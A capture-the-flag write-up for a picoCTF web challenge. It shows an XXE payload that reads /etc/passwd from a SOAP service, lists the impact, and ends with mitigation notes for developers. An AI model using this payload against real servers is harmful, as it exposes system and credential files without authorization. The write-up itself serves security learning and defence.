# 🧼 XXE Exploitation in SOAP Web Service (picoCTF)

**Author:** Geoffrey Njogu  
**Category:** Web Exploitation  
**Difficulty:** 🟠 Medium  
**Tags:** `XXE`, `SOAP`, `BurpSuite`, `CTF`, `Web Exploitation`

---

## 📘 Description

> The web project was rushed and no security assessment was done. Can you read the `/etc/passwd` file?

---

## 🚀 Challenge Deployment


---

## 🔥 Vulnerability: XML External Entity Injection (XXE)

The application accepts raw XML input with `Content-Type: application/xml`, and parses it insecurely. This allows an attacker to define external entities (`<!ENTITY>`) that point to sensitive files on the server.

---

## 💣 Exploit Payload

### 🧪 Proof of Concept (Read `/etc/passwd`)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<data>
  <ID>&xxe;</ID>
</data>
```

| Property        | Impact                                                       |
| --------------- | ------------------------------------------------------------ |
| Confidentiality | 🔴 Exposed sensitive files (`/etc/passwd`, API keys, config) |
| Integrity       | 🟡 Potential alteration if parser injects data into logic    |
| Availability    | 🔴 Possible DoS via Billion Laughs attack                    |


🛡️ Mitigation (Developer Notes)
>To prevent this vulnerability:
>🚫 Disable external entity expansion
>🚫 Disallow DOCTYPE declarations
>✅ Validate input using strict XML schema
>✅ Consider switching to JSON if XML is not necessary
